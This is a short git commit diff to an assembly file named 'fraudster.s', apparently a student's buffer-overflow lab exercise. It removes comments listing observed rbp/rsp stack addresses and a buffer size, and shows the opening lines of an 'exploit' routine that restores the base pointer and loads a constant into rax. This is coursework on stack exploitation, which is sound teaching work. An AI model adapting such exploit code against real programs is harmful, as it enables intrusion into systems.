eec86dbfb0e45b12483f8c4decb2dead04a39c83
mikaylawalsh <mikayla_walsh@brown.edu>
2022-10-17 13:15:39 -0400

    10/17-8

--- fraudster.s
+++ fraudster.s
@@ -1,11 +1,3 @@
-# find all 5 rbp/rsp values: 
-    # rbp: 0x55782fe0, rsp: 0x55782fc0 // return 5578
-    # rbp: 0x55782f70, rsp: 0x55782f50 // return 5578
-    # rbp: 0x55782f60, rsp: 0x55782f40 // return 5578
-    # rbp: 0x55783040, rsp: 0x55783020 // return 5578 
-    # rbp: 0x55782ff0, rsp: 0x55782fd0 // return 5578
-# find size of buffer: 544 - getbufn 220 in decimal is 544  
-
 exploit:
     lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp to restore canary 
     mov $0x622524ed,%rax
